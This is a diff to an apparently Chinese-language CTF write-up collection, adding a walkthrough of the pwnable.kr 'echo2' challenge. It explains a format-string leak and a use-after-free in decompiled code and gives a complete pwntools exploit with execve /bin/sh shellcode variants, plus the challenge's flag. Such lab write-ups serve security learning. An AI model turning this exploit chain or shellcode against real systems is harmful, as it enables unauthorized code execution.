@@ -15911,7 +15911,7 @@ flag = getflag(cookie)
 log.success('Flag: {}'.format(term.text.bold_italic_yellow(flag)))
 ```
 
-由于网络响应较慢，我们可以利用上一题的账号密码将本题的`exploit.py`上传到系统中，以更快地执行代码。
+由于网络响应较慢，我们可以利用之前题目的`ssh`账号密码将本题的`exploit.py`上传到系统中，以更快地执行代码。
 
 ```python
 from pwn import *
@@ -16145,6 +16145,159 @@ shellcode = b'H1\xf6\xf7\xe6PH\xbb/bin//shST_\xb0;\x0f\x05'
 # shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
 # shellcode = b'H1\xffH1\xf6H1\xd2H1\xc0PH\xbb/bin//shSH\x89\xe7\xb0;\x0f\x05'
 payload = cyclic(0x20+0x8) + p64(id_addr) + shellcode
+io.sendline(payload)
+io.interactive()
+```
+
+------
+
+### echo2
+
+这是**Pwnable.kr**的第三十四个挑战`echo2`，来自**[Rookiss]**部分。
+
+```bash
+Pwn this echo service.
+
+download : http://pwnable.kr/bin/echo2
+
+Running at : nc pwnable.kr 9011
+```
+
+这题只给出一个二进制文件`echo2`，让我们下载看看文件信息。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ wget http://pwnable.kr/bin/echo2
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ sudo chmod +x ./echo2
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ file ./echo2         
+./echo2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=4edd53a788f83abbdd5c911fc2a96fd6c5d42897, not stripped
+                                                                                                          
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ checksec --file=./echo2
+[*] '/home/tyd/ctf/pwn/pwnable.kr/echo2'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+```
+
+用`IDA Pro 64bit`打开二进制文件`echo2`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  _QWORD *v3; // rax
+  unsigned int i; // [rsp+Ch] [rbp-24h] BYREF
+  _QWORD v6[4]; // [rsp+10h] [rbp-20h] BYREF
+
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 1, 0LL);
+  o = malloc(0x28uLL);
+  *((_QWORD *)o + 3) = greetings;
+  *((_QWORD *)o + 4) = byebye;
+  printf("hey, what's your name? : ");
+  __isoc99_scanf("%24s", v6);
+  v3 = o;
+  *(_QWORD *)o = v6[0];
+  v3[1] = v6[1];
+  v3[2] = v6[2];
+  id = v6[0];
+  getchar();
+  func[0] = (__int64)echo1;
+  qword_602088 = (__int64)echo2;
+  qword_602090 = (__int64)echo3;
+  for ( i = 0; i != 121; i = getchar() )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        puts("\n- select echo type -");
+        puts("- 1. : BOF echo");
+        puts("- 2. : FSB echo");
+        puts("- 3. : UAF echo");
+        puts("- 4. : exit");
+        printf("> ");
+        __isoc99_scanf("%d", &i);
+        getchar();
+        if ( i > 3 )
+          break;
+        ((void (*)(void))func[i - 1])();
+      }
+      if ( i == 4 )
+        break;
+      puts("invalid menu");
+    }
+    cleanup();
+    printf("Are you sure you want to exit? (y/n)");
+  }
+  puts("bye");
+  return 0;
+}
+```
+
+根据题目名称选择`echo2`，该函数存在格式化字符串漏洞，我们可以利用该漏洞读写任意`8`字节内存地址。
+
+```c
+__int64 echo2()
+{
+  char format[32]; // [rsp+0h] [rbp-20h] BYREF
+
+  (*((void (__fastcall **)(void *))o + 3))(o);
+  get_input(format, 32LL);
+  printf(format);
+  (*((void (__fastcall **)(void *))o + 4))(o);
+  return 0LL;
+}
+```
+
+继续审计`echo3`，`echo3`函数能配合`main`函数中的溢出逻辑缺陷来制作`UAF`漏洞，我们选择选项`4`退出时，程序会执行`cleanup()`函数，该函数会执行`free(o)`释放掉之前申请的`0x28`字节的内存空间，接着程序又会询问是否确认退出，如果选否的话又会回到`main`函数的主逻辑继续执行。而`echo3`函数申请了`0x20`大小的堆空间，根据`glibc`的堆管理策略，这次申请的堆会直接使用上次释放的堆块，这样如果覆盖了第`4`个`8`字节就会导致后面执行`(*((void (__fastcall **)(void *))o + 3))(o);`时执行我们覆盖的地址。
+
+```c
+__int64 echo3()
+{
+  char *s; // [rsp+8h] [rbp-8h]
+
+  (*((void (__fastcall **)(void *))o + 3))(o);
+  s = (char *)malloc(0x20uLL);
+  get_input(s, 32LL);
+  puts(s);
+  free(s);
+  (*((void (__fastcall **)(void *))o + 4))(o);
+  return 0LL;
+}
+```
+
+整体思路是向`v6`处写入`shellcode`，利用`printf`格式化字符串漏洞泄露栈地址后计算出`v6`的地址，之后利用`UAF`漏洞跳转到`v6`执行。
+
+编写`Python`代码求解，拿到`shell`后输入`cat flag`即可得到`fun_with_UAF_and_FSB :)`。
+
+```python
+from pwn import *
+
+io = remote('pwnable.kr', 9011)
+select_menu = lambda choice: io.sendlineafter(b'> ', str(choice).encode())
+input_name = lambda name: io.sendlineafter(b"what's your name? : ", name)
+shellcode = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
+# 以下这俩个shellcode也能打通
+# shellcode = b'H1\xf6\xf7\xe6PH\xbb/bin//shST_\xb0;\x0f\x05'
+# shellcode = b'H1\xf6\xf7\xe6H\xbb/bin/sh\x00ST_\xb0;\x0f\x05'
+input_name(shellcode)
+select_menu(2)
+io.recvline()  # hello
+io.sendline(b'%10$p')
+addr = int(io.recvline().strip(), 16)-0x20
+select_menu(4)
+io.sendlineafter(b'(y/n)', b'n')  # Are you sure you want to exit? (y/n)
+select_menu(3)
+io.recvline()  # hello 
+payload = cyclic(24) + p64(addr)
 io.sendline(payload)
 io.interactive()
 ```
